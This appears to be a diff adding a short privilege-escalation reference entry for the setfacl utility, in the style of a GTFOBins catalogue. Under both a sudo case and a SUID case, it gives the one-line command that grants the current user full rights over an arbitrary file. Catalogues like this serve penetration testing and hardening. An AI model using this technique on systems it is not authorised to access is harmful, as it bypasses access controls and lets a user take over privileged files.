@@ -1,0 +1,13 @@
+setfacl
+=======
+
+Privilege Escalation
+--------------------
+
+[Sudo]
+    setfacl -m u:$(id -un):rwx /path/to/input-file
+    This can be run with elevated privileges to change ownership and then read, write, or execute a file.
+
+[SUID]
+    setfacl -m u:$(id -un):rwx /path/to/input-file
+    This can be run with elevated privileges to change ownership and then read, write, or execute a file.
